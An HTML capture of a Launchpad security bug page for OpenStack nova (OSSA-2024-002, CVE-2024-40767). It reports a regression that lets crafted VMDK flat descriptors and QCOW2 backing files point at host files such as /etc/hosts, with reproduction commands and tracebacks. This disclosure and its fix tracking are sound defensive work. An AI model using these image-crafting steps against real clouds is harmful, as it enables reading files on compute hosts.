<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
  <head>
<base href="https://bugs.launchpad.net/nova/+bug/2071734/+index" />

    <meta charset="UTF-8" />
    <title>Bug #2071734 “[OSSA-2024-002] Incomplete file access fix and reg...” : Bugs : OpenStack Compute (nova)</title>
    <link rel="apple-touch-icon" sizes="180x180" href="/@@/apple-touch-icon.png?v=2022" />
    <link rel="icon" type="image/png" sizes="32x32" href="/@@/favicon-32x32.png?v=2022" />
    <link rel="icon" type="image/png" sizes="16x16" href="/@@/favicon-16x16.png?v=2022" />
    <link rel="manifest" href="/@@/site.webmanifest?v=2022" />
    <link rel="mask-icon" href="/@@/safari-pinned-tab.svg?v=2022" color="#e9531f" />
    <link rel="shortcut icon" href="/@@/favicon.ico?v=2022" />
    <meta name="msapplication-TileColor" content="#da532c" />
    <meta name="msapplication-config" content="/@@/browserconfig.xml?v=2022" />
    <meta name="theme-color" content="#ffffff" />
    <link rel="canonical" href="https://bugs.launchpad.net/bugs/2071734" />
    
      <link rel="alternate" type="application/atom+xml" href="http://feeds.launchpad.net/bugs/2071734/bug.atom" title="Bug 2071734 Feed" />
    

    
  
  <link type="text/css" rel="stylesheet" media="screen, print" href="/+icing/rev6394e03793719e8d73f5a60b5439440e693c92f1/combo.css" />


    

    
      <meta name="description" content="When fixing bug #2059809, a regression of the previous bug #1996188 has been introduced.

TLDR: nova is allowing back VMDK with wrong types and QCOW with backing files.

Long:

The following steps were used to reproduce on a Bobcat (2023.2) OpenStack + nova patches for bug #2059809 (not yet merge when writing this report)

Create a vmdk file:
$ qemu-img create -f vmdk disk-vmdk.vmdk 1M -o subformat=monolithicFlat
$ sed -i -r 's|disk-vmdk-flat.vmdk|/etc/hosts|' disk-vmdk.vmdk

Create a faulty ..." />
      <meta property="og:description" content="When fixing bug #2059809, a regression of the previous bug #1996188 has been introduced.

TLDR: nova is allowing back VMDK with wrong types and QCOW with backing files.

Long:

The following steps were used to reproduce on a Bobcat (2023.2) OpenStack + nova patches for bug #2059809 (not yet merge when writing this report)

Create a vmdk file:
$ qemu-img create -f vmdk disk-vmdk.vmdk 1M -o subformat=monolithicFlat
$ sed -i -r 's|disk-vmdk-flat.vmdk|/etc/hosts|' disk-vmdk.vmdk

Create a faulty ..." />
    

    
    
      <meta property="og:title" content="Bug #2071734 “[OSSA-2024-002] Incomplete file access fix and reg...” : Bugs : OpenStack Compute (nova)" />
      <meta property="og:type" content="website" />
      <meta property="og:image" content="/@@/launchpad-og-image.png" />
      <meta property="og:url" content="https://bugs.launchpad.net/bugs/2071734" />
      <meta property="og:site_name" content="Launchpad" />
    

    

    
  

  
  
  <script type="text/javascript">
    var LP = {
        cache: {},
        links: {}
    };
  </script>

  

  <script type="text/javascript">var cookie_scope = '; Path=/; Secure; Domain=.launchpad.net';</script>

   <script type="text/javascript" src="/+combo/rev6394e03793719e8d73f5a60b5439440e693c92f1/?yui/yui/yui-min.js&amp;lp/meta.js&amp;yui/loader/loader-min.js"></script>
   <script type="text/javascript">
        var raw = null;
        if (LP.devmode) {
           raw = 'raw';
        }
        YUI.GlobalConfig = {
            combine: true,
            comboBase: '/+combo/rev6394e03793719e8d73f5a60b5439440e693c92f1/?',
            root: 'yui/',
            filter: raw,
            debug: false,
            fetchCSS: false,
            maxURLLength: 2000,
            groups: {
                lp: {
                    combine: true,
                    base: '/+combo/rev6394e03793719e8d73f5a60b5439440e693c92f1/?lp/',
                    comboBase: '/+combo/rev6394e03793719e8d73f5a60b5439440e693c92f1/?',
                    root: 'lp/',
                    // comes from including lp/meta.js
                    modules: LP_MODULES,
                    fetchCSS: false
                }
            }
        }</script>

  <script type="text/javascript">
      // we need this to create a single YUI instance all events and code
      // talks across. All instances of YUI().use should be based off of
      // LPJS instead.
      var LPJS = new YUI();
  </script>



    <script id="base-layout-load-scripts" type="text/javascript">
        //<![CDATA[
        LPJS.use('base', 'node', 'console', 'event',
            'oop', 'lp', 'lp.app.foldables','lp.app.sorttable',
            'lp.app.inlinehelp', 'lp.app.links',
            'lp.bugs.bugtask_index', 'lp.bugs.subscribers',
            'lp.app.ellipsis', 'lp.code.branchmergeproposal.diff',
            'lp.views.global',
             function(Y) {

            Y.on("domready", function () {
                var global_view = new Y.lp.views.Global();
                global_view.render();

                Y.lp.app.sorttable.SortTable.init();
                Y.lp.app.inlinehelp.init_help();
                Y.lp.activate_collapsibles();
                Y.lp.app.foldables.activate();
                Y.lp.app.links.check_valid_lp_links();
            });

            Y.on('lp:context:web_link:changed', function(e) {
                  window.location = e.new_value;
            });
        });
        //]]>
    </script>
    <script id="base-helper-functions" type="text/javascript">
         //<![CDATA[
        // This code is pulled from lp.js that needs to be available on every
        // request. Pulling here to get it outside the scope of the YUI block.
        function setFocusByName(name) {
            // Focus the first element matching the given name which can be focused.
            var nodes = document.getElementsByName(name);
            var i, node;
            for (i = 0; i < nodes.length; i++) {
                node = nodes[i];
                if (node.focus) {
                    try {
                        // Trying to focus a hidden element throws an error in IE8.
                        if (node.offsetHeight !== 0) {
                            node.focus();
                        }
                    } catch (e) {
                        LPJS.use('console', function(Y) {
                            Y.log('In setFocusByName(<' +
                                node.tagName + ' type=' + node.type + '>): ' + e);
                        });
                    }
                    break;
                }
            }
        }

        function selectWidget(widget_name, event) {
          if (event && (event.keyCode === 9 || event.keyCode === 13)) {
              // Avoid firing if user is tabbing through or simply pressing
              // enter to submit the form.
              return;
          }
          document.getElementById(widget_name).checked = true;
        }
        //]]>
    </script>

    
      
      <script type="text/javascript" id="available-official-tags-js">var available_official_tags = ["antelope-rc-potential", "api", "api-ref", "availability-zones", "bobcat-rc-potential", "cells", "ceph", "cinder", "compute", "conductor", "config", "console", "cyborg", "dalmatian-rc-potential", "db", "doc", "ec2", "evacuate", "fault-injection", "gate-failure", "glance", "hyper-v", "i18n", "image-cache", "in-stable-liberty", "in-stable-newton", "in-stable-ocata", "ironic", "kilo-backport-potential", "liberty-backport-potential", "libvirt", "live-migration", "low-hanging-fruit", "lxc", "metadata", "mitaka-backport-potential", "needs-attention", "needs-functional-test", "needs.openstack-version", "network", "neutron", "newton-backport-potential", "nfs", "notifications", "nova-manage", "nova-network", "numa", "ocata-backport-potential", "openstack-version.grizzly", "openstack-version.havana", "openstack-version.icehouse", "openstack-version.juno", "openstack-version.kilo", "openstack-version.liberty", "openstack-version.mitaka", "openstack-version.newton", "openstack-version.ocata", "openstack-version.pike", "ops", "oslo", "pci", "performance", "pike-backport-potential", "placement", "policy", "postgresql", "powervm", "privsep", "queens-backport-potential", "quotas", "race-condition", "rbac", "reboot", "rebuild", "rescue", "resize", "resource-tracker", "rfe", "rootwrap", "s390x", "scheduler", "sdk", "security", "security-groups", "serviceability", "shared-storage", "shelve", "snapshot", "stacktrace", "stein-rc-potential", "testing", "train-rc-potential", "unified-objects", "upgrade", "ussuri-backport-potential", "ussuri-rc-potential", "vgpu", "victoria-rc-potential", "vmware", "volumes", "wallaby-rc-potential", "xen", "xena-rc-potential", "xenserver", "yoga-rc-potential", "zed-rc-potential", "zvm"];</script>
      <script type="text/javascript">
        LPJS.use('base', 'node', 'oop', 'event', 'lp.bugs.bugtask_index',
                  'lp.bugs.subscribers', 'lp.code.branchmergeproposal.diff',
                  'lp.app.comment', 'lp.services.messages.edit', function(Y) {
            Y.on('domready', function() {
                Y.lp.code.branchmergeproposal.diff.connect_diff_links();
                Y.lp.bugs.bugtask_index.setup_bugtask_index();
                Y.lp.bugs.bugtask_index.setup_bugtask_table();
                LP.cache.comment_context = LP.cache.bug;
                var cl = new Y.lp.app.comment.CommentList();
                cl.render();
                var sl = new Y.lp.bugs.subscribers.createBugSubscribersLoader({
                    container_box: '#other-bug-subscribers',
                    subscribers_details_view:
                        '/+bug-portlet-subscribers-details',
                    subscribe_someone_else_link: '.menu-link-addsubscriber'
                }, window);

                Y.lp.services.messages.edit.setup();
            });
         });
      </script>
      <style type="text/css">
        /* Align the 'add comment' link to the right of the comment box. */
        #add-comment-form textarea { width: 100%; }
        #add-comment-form { max-width: 60em; padding-bottom: 4em; }
        #add-comment-form .actions {float: right;}
        .buglink-summary dd { font-size: 10px; }
        a#privacy-link:link:hover, a#privacy-link:visited:hover {text-decoration:none;}
      </style>
      <style type="text/css">
        .yui3-overlay .value label  {
          /* It normally makes sense for form labels to be bold, but since
          this form consists only of radio buttons, there's nothing but labels
          so we just get wall-to-wall bold. */
          font-weight: normal !important;
        }
      </style>
    
    
  </head>

  <body id="document" itemscope="" itemtype="http://schema.org/WebPage" class="tab-bugs
      main_side
      public
      yui3-skin-sam">
          
          
    <div class="yui-d0">
      <div id="locationbar" class="login-logout">
        

<div id="logincontrol"><a href="https://bugs.launchpad.net/nova/+bug/2071734/+login">Log in / Register</a></div>



      </div><!--id="locationbar"-->

      <div id="watermark" class="watermark-apps-portlet">
        <div>
          <a href="https://launchpad.net/nova"><img alt="" width="64" height="64" src="https://launchpadlibrarian.net/324577028/nova64.png" /></a>
        </div>
        <div class="wide">
          <h2 id="watermark-heading"><a href="https://launchpad.net/nova">OpenStack Compute (nova)</a></h2>
        </div>
        
  <!-- Application Menu -->
  <ul class="facetmenu">
    
      
      <li class="overview"><a href="https://launchpad.net/nova">Overview</a></li>
      
    
    
      
      <li class="branches"><a href="https://code.launchpad.net/nova">Code</a></li>
      
    
    
      <li class="bugs active"><a href="https://bugs.launchpad.net/nova">Bugs</a></li>
      
      
    
    
      
      <li class="specifications"><a href="https://blueprints.launchpad.net/nova">Blueprints</a></li>
      
    
    
      
      <li class="translations"><a href="https://translations.launchpad.net/nova">Translations</a></li>
      
    
    
      
      <li class="answers"><a href="https://answers.launchpad.net/nova">Answers</a></li>
      
    
  </ul>

      </div>

      <div class="yui-t4">
        <div id="maincontent" class="yui-main">
          <div class="yui-b" dir="ltr">
            <div class="context-publication">
              
      <h1 id="edit-title">
<span class="yui3-editable_text-text ellipsis" style="max-width: 95%;">
    [OSSA-2024-002] Incomplete file access fix and regression for QCOW2 backing files and VMDK flat descriptors (CVE-2024-40767)
</span>
  
</h1>



    
              

              <div id="registration" class="registering">
                
      Bug #2071734 reported by
      <a href="https://launchpad.net/~arnaud-morin" class="sprite person">Arnaud Morin</a>
      <time title="2024-07-02 20:43:08 UTC" datetime="2024-07-02T20:43:08.365346+00:00">on 2024-07-02</time>
      
    
              </div>
            </div>

            
            <div id="request-notifications">
              
            </div>

            
              <div>

      

      <div id="bug-is-duplicate">
          
      </div>
      

      <div style="float: right;">
        <span><a href="/+help-bugs/bug-heat.html" target="help" class="sprite flame">282</a></span>
      </div>

      


  
  
    <div class="actions">
      <span id="affectsmetoo" style="display: inline">This bug affects 1 person</span>
    </div>
  



    <table id="affected-software" class="listing">
      <thead>
        <tr>
          <th colspan="2">Affects</th>
          <th>Status</th>
          <th>Importance</th>
          <th>Assigned to</th>
          <th>Milestone</th>
        </tr>
      </thead>

      <tbody>
        
          
  <tr class="highlight" id="tasksummary3217143">
    <td>
      
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary3217143">
        <span class="yui3-activator-data-box">
            <a class="sprite product" href="https://bugs.launchpad.net/nova">OpenStack Compute (nova)</a>
        </span>
        
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        <span style="float: left" class="value statusFIXRELEASED">Fix Released</span>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceCRITICAL">Critical</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary3217143">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  


        
        
          
  <tr id="tasksummary3217144">
    <td>
      
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary3217144">
        <span class="yui3-activator-data-box">
            <a class="sprite product" href="https://bugs.launchpad.net/ossa">OpenStack Security Advisory</a>
        </span>
        
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        <span style="float: left" class="value statusFIXRELEASED">Fix Released</span>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceHIGH">High</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary3217144">
          <span class="yui3-activator-data-box">
            <a class="sprite person" href="https://launchpad.net/~fungi">Jeremy Stanley</a>
            
          </span>
          
          
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  


        
      </tbody>

    </table>








      <div id="maincontentsub">
        <div class="top-portlet">

      <div itemprop="mainContentOfPage" class="report">
        

        <div>
  <div class="lazr-multiline-edit" id="edit-description">
  <div class="clearfix">
    

    <h3>Bug Description</h3>
  </div>

  <div class="yui3-editable_text-text"><p>When fixing <a href="/bugs/2059809" class="bug-link">bug #2059809</a>, a regression of the previous <a href="/bugs/1996188" class="bug-link">bug #1996188</a> has been introduced.</p>
<p>TLDR: nova is allowing back VMDK with wrong types and QCOW with backing files.</p>
<p>Long:</p>
<p>The following steps were used to reproduce on a Bobcat (2023.2) OpenStack + nova patches for <a href="/bugs/2059809" class="bug-link">bug #2059809</a> (not yet merge when writing this report)</p>
<p>Create a vmdk file:<br />
$ qemu-img create -f vmdk disk-vmdk.vmdk 1M -o subformat=<wbr />monolithicFlat<br />
$ sed -i -r &#x27;s|disk-<wbr />vmdk-flat.<wbr />vmdk|/etc/<wbr />hosts|&#x27; disk-vmdk.vmdk</p>
<p>Create a faulty qcow image:<br />
$ qemu-img create -f qcow2 -F raw -b /etc/hosts disk-bf.qcow2 1M</p>
<p>Upload both images as raw (the default)<br />
$ for i in disk-bf.qcow2 disk-vmdk.vmdk ; do openstack image create --file $i $i ; done</p>
<p>Boot an instance from those images:<br />
$ openstack server create --flavor small --image disk-vmdk.vmdk --net public disk-vmdk.vmdk<br />
$ openstack server create --flavor small --image disk-bf.qcow2 --net public disk-bf.qcow2</p>
<p>Results<br />
=======<br />
VMDK monolithicFlat<br />
-------------------</p>
<p>Traceback (most recent call last):<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />nova/compute/<wbr />manager.<wbr />py&quot;, line 2615, in _build_<wbr />and_run_<wbr />instance<br />
&nbsp;&nbsp;&nbsp;&nbsp;self.<wbr />driver.<wbr />spawn(context, instance, image_meta,<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />nova/virt/<wbr />libvirt/<wbr />driver.<wbr />py&quot;, line 4388, in spawn<br />
&nbsp;&nbsp;&nbsp;&nbsp;created_<wbr />instance_<wbr />dir, created_disks = self._create_image(<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />nova/virt/<wbr />libvirt/<wbr />driver.<wbr />py&quot;, line 4790, in _create_image<br />
&nbsp;&nbsp;&nbsp;&nbsp;created_disks = self._create_<wbr />and_inject_<wbr />local_root(<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />nova/virt/<wbr />libvirt/<wbr />driver.<wbr />py&quot;, line 4921, in _create_<wbr />and_inject_<wbr />local_root<br />
&nbsp;&nbsp;&nbsp;&nbsp;self.<wbr />_try_fetch_<wbr />image_cache(<wbr />backend, fetch_func, context,<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />nova/virt/<wbr />libvirt/<wbr />driver.<wbr />py&quot;, line 10940, in _try_fetch_<wbr />image_cache<br />
&nbsp;&nbsp;&nbsp;&nbsp;image.<wbr />cache(fetch_<wbr />func=fetch_<wbr />func,<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />nova/virt/<wbr />libvirt/<wbr />imagebackend.<wbr />py&quot;, line 288, in cache<br />
&nbsp;&nbsp;&nbsp;&nbsp;self.<wbr />create_<wbr />image(fetch_<wbr />func_sync, base, size,<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />nova/virt/<wbr />libvirt/<wbr />imagebackend.<wbr />py&quot;, line 615, in create_image<br />
&nbsp;&nbsp;&nbsp;&nbsp;copy_<wbr />raw_image(<wbr />base, self.path, size)<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />oslo_concurrenc<wbr />y/lockutils.<wbr />py&quot;, line 414, in inner<br />
&nbsp;&nbsp;&nbsp;&nbsp;return f(*args, **kwargs)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />nova/virt/<wbr />libvirt/<wbr />imagebackend.<wbr />py&quot;, line 590, in copy_raw_image<br />
&nbsp;&nbsp;&nbsp;&nbsp;self.<wbr />resize_<wbr />image(size)<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />nova/virt/<wbr />libvirt/<wbr />imagebackend.<wbr />py&quot;, line 621, in resize_image<br />
&nbsp;&nbsp;&nbsp;&nbsp;disk.<wbr />extend(<wbr />image, size)<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />nova/virt/<wbr />disk/api.<wbr />py&quot;, line 128, in extend<br />
&nbsp;&nbsp;&nbsp;&nbsp;processutil<wbr />s.execute(<wbr />&#x27;qemu-img&#x27;<wbr />, &#x27;resize&#x27;, image.path, size)<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />oslo_concurrenc<wbr />y/processutils.<wbr />py&quot;, line 438, in execute<br />
&nbsp;&nbsp;&nbsp;&nbsp;raise ProcessExecutio<wbr />nError(<wbr />exit_code=<wbr />_returncode,<br />
oslo_concurrenc<wbr />y.processutils.<wbr />ProcessExecutio<wbr />nError: Unexpected error while running command.<br />
Command: qemu-img resize /var/lib/<wbr />nova/instances/<wbr />07b5907b-<wbr />5efc-4fdf-<wbr />8b15-4b47a820c2<wbr />f8/disk 2147483648<br />
Exit code: 1<br />
Stdout: &#x27;&#x27;<br />
Stderr: &quot;qemu-img: Could not open &#x27;/var/lib/<wbr />nova/instances/<wbr />07b5907b-<wbr />5efc-4fdf-<wbr />8b15-4b47a820c2<wbr />f8/disk&#x27;<wbr />: Could not open &#x27;/etc/hosts&#x27;: Permission denied\n&quot;</p>
<p>Qemu tried to read /etc/hosts. My system permissions prevented it, but nova did nothing about it: wrong.</p>
<p>QEMU Backing File<br />
-----------------<br />
Traceback (most recent call last):<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />nova/compute/<wbr />manager.<wbr />py&quot;, line 2615, in _build_<wbr />and_run_<wbr />instance<br />
&nbsp;&nbsp;&nbsp;&nbsp;self.<wbr />driver.<wbr />spawn(context, instance, image_meta,<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />nova/virt/<wbr />libvirt/<wbr />driver.<wbr />py&quot;, line 4415, in spawn<br />
&nbsp;&nbsp;&nbsp;&nbsp;self.<wbr />_create_<wbr />guest_with_<wbr />network(<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />nova/virt/<wbr />libvirt/<wbr />driver.<wbr />py&quot;, line 7785, in _create_<wbr />guest_with_<wbr />network<br />
&nbsp;&nbsp;&nbsp;&nbsp;with excutils.<wbr />save_and_<wbr />reraise_<wbr />exception(<wbr />):<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />oslo_utils/<wbr />excutils.<wbr />py&quot;, line 227, in __exit__<br />
&nbsp;&nbsp;&nbsp;&nbsp;self.<wbr />force_reraise(<wbr />)<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />oslo_utils/<wbr />excutils.<wbr />py&quot;, line 200, in force_reraise<br />
&nbsp;&nbsp;&nbsp;&nbsp;raise self.value<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />nova/virt/<wbr />libvirt/<wbr />driver.<wbr />py&quot;, line 7763, in _create_<wbr />guest_with_<wbr />network<br />
&nbsp;&nbsp;&nbsp;&nbsp;guest = self._create_guest(<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />nova/virt/<wbr />libvirt/<wbr />driver.<wbr />py&quot;, line 7702, in _create_guest<br />
&nbsp;&nbsp;&nbsp;&nbsp;guest.<wbr />launch(<wbr />pause=pause)<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />nova/virt/<wbr />libvirt/<wbr />guest.py&quot;<wbr />, line 167, in launch<br />
&nbsp;&nbsp;&nbsp;&nbsp;with excutils.<wbr />save_and_<wbr />reraise_<wbr />exception(<wbr />):<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />oslo_utils/<wbr />excutils.<wbr />py&quot;, line 227, in __exit__<br />
&nbsp;&nbsp;&nbsp;&nbsp;self.<wbr />force_reraise(<wbr />)<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />oslo_utils/<wbr />excutils.<wbr />py&quot;, line 200, in force_reraise<br />
&nbsp;&nbsp;&nbsp;&nbsp;raise self.value<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />nova/virt/<wbr />libvirt/<wbr />guest.py&quot;<wbr />, line 165, in launch<br />
&nbsp;&nbsp;&nbsp;&nbsp;return self._domain.<wbr />createWithFlags<wbr />(flags)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />eventlet/<wbr />tpool.py&quot;<wbr />, line 193, in doit<br />
&nbsp;&nbsp;&nbsp;&nbsp;result = proxy_call(<wbr />self._autowrap, f, *args, **kwargs)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />eventlet/<wbr />tpool.py&quot;<wbr />, line 151, in proxy_call<br />
&nbsp;&nbsp;&nbsp;&nbsp;rv = execute(f, *args, **kwargs)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />eventlet/<wbr />tpool.py&quot;<wbr />, line 132, in execute<br />
&nbsp;&nbsp;&nbsp;&nbsp;six.reraise(c, e, tb)<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />six.py&quot;<wbr />, line 719, in reraise<br />
&nbsp;&nbsp;&nbsp;&nbsp;raise value<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />eventlet/<wbr />tpool.py&quot;<wbr />, line 86, in tworker<br />
&nbsp;&nbsp;&nbsp;&nbsp;rv = meth(*args, **kwargs)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />libvirt.<wbr />py&quot;, line 1409, in createWithFlags<br />
&nbsp;&nbsp;&nbsp;&nbsp;raise libvirtError(<wbr />&#x27;virDomainCreat<wbr />eWithFlags(<wbr />) failed&#x27;)<br />
libvirt.<wbr />libvirtError: internal error: cannot update AppArmor profile &#x27;libvirt-<wbr />6bd32822-<wbr />2454-402a-<wbr />9617-6ec66e0090<wbr />f4&#x27;</p>
<p>In libvirtd journalctl:</p>
<p>Jul 02 20:22:44 compute-1 libvirtd[959438]: internal error: Child process (LIBVIRT_<wbr />LOG_OUTPUTS=<wbr />3:stderr /usr/lib/<wbr />libvirt/<wbr />virt-aa-<wbr />helper -r -u libvirt-<wbr />6bd32822-<wbr />2454-402a-<wbr />9617-6ec66e0090<wbr />f4 -F /dev/net/tun) unexpected exit status 1: virt-aa-helper: error: /etc/hosts</p>
<p>Here it&#x27;s apparmor that prevented the boot, but nova should have catched it: wrong</p>
<p>Expected results<br />
----------------</p>
<p>Nova should raise an exception like it does previously.<br />
E.G. for VMDK: nova.exception.<wbr />ImageUnacceptab<wbr />le: Image xyz is unacceptable: Invalid VMDK create-type specified</p></div>
  </div>

  
</div>


        <div style="margin:-10px 0 20px 5px" class="clearfix">
          <span>See <a href="comments/0">original description</a></span>
        </div>

        <div id="bug-tags">
          <span id="tags-heading">
            Tags:
          </span>
          <span id="tag-list">
            <a class="unofficial-tag" href="/nova/+bugs?field.tag=in-unmaintained-yoga">in-unmaintained-yoga</a>
            <a class="unofficial-tag" href="/nova/+bugs?field.tag=in-unmaintained-zed">in-unmaintained-zed</a>
          </span>
          
        </div>

        <script type="text/javascript">
          LPJS.use('event', 'node', 'lp.bugs.tags_entry', function(Y) {
              Y.on('domready',
                   function(e) {
                       Y.lp.bugs.tags_entry.setup_tag_entry(
                           available_official_tags);
                   },
                   window);
          });
        </script>

        <div class="clearfix"></div>
      </div>

      <div id="branches-and-cves">
        <div id="bug-branches-container" style="float: left">
          
        </div><!-- bug-branch-container -->

        <div class="cves">
          <h2>CVE References</h2>
          <ul>
            <li class="sprite cve">
              <a href="/bugs/cve/2024-32498" title="** RESERVED ** This candidate has bee...">2024-32498</a>
            </li>
            <li class="sprite cve">
              <a href="/bugs/cve/2024-40767" title="This CVE was automatically created fr...">2024-40767</a>
            </li>
            <li class="sprite cve">
              <a href="/bugs/cve/2024-4467" title="** RESERVED ** This candidate has bee...">2024-4467</a>
            </li>
          </ul>
        </div>

        <div class="clearfix"></div>
      </div> <!-- branches and CVEs -->

      </div>

      <div>
      
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
    
    <time title="2024-07-02 20:46:48 UTC" datetime="2024-07-02T20:46:48.387364+00:00">on 2024-07-02</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>description</b>:
      </td>
      <td>
        updated
      </td>
    </tr>
  
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Incomplete
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/1" data-i-can-edit="False">
